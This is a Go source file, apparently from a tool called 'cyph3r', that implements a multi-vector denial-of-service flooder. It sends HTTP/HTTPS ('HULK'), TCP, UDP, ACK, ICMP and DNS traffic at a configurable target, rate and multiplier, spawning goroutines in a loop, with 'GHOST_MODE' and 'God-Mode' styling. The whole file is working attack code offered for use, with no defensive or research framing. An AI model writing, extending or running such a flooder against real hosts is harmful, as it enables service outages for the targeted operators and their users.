package intel

import (
	"context"
	"fmt"
	"net"
	"net/http"
	"time"
	"github.com/AnonPhoenix420/cyph3r/internal/models"
	"github.com/AnonPhoenix420/cyph3r/internal/output"
)

func RunTacticalTest(cfg models.TacticalConfig, ctx context.Context, client *http.Client) {
	fmt.Printf("\n%s[GHOST_MODE] ENGAGING %s OMNI-VECTOR -> %s:%s%s\n", output.NeonPink, cfg.Vector, cfg.Target, cfg.Port, output.Reset)
	fmt.Printf("%s[!] FORCE_MULTIPLIER: %dx ACTIVE (%d Total Req/Sec)%s\n", output.Amber, cfg.Power, cfg.PPS*cfg.Power, output.Reset)

	ticker := time.NewTicker(time.Second / time.Duration(cfg.PPS))
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			fmt.Printf("\n%s[+] Mission vectors collapsed.%s\n", output.NeonGreen, output.Reset)
			return
		case <-ticker.C:
			for i := 0; i < cfg.Power; i++ {
				go executeVector(cfg, client)
			}
		}
	}
}

func executeVector(cfg models.TacticalConfig, client *http.Client) {
	addr := net.JoinHostPort(cfg.Target, cfg.Port)
	switch cfg.Vector {
	case "HULK", "HTTPS", "HTTP":
		proto := "https://"
		if cfg.Vector == "HTTP" { proto = "http://" }
		req, _ := http.NewRequest("GET", proto+addr, nil)
		req.Header.Set("User-Agent", "Cyph3r/God-Mode-Dynamic")
		resp, err := client.Do(req)
		if err == nil { resp.Body.Close() }
	case "SYN", "TCP":
		d := net.Dialer{Timeout: 400 * time.Millisecond}
		conn, err := d.Dial("tcp", addr)
		if err == nil { time.Sleep(20 * time.Millisecond); conn.Close() }
	case "UDP":
		conn, _ := net.Dial("udp", addr)
		if conn != nil { conn.Write(make([]byte, 1300)); conn.Close() }
	case "ACK":
		conn, _ := net.Dial("tcp", addr)
		if conn != nil { conn.Write([]byte("ACK")); conn.Close() }
	case "ICMP":
		conn, _ := net.Dial("ip4:icmp", cfg.Target)
		if conn != nil { conn.Write([]byte{8, 0, 0, 0, 0, 0, 0, 0}); conn.Close() }
	case "DNS":
		conn, _ := net.Dial("udp", cfg.Target+":53")
		if conn != nil { conn.Write([]byte{0x24, 0x1a, 0x01, 0x00, 0x00, 0x01, 0x00, 0x00}); conn.Close() }
	}
}
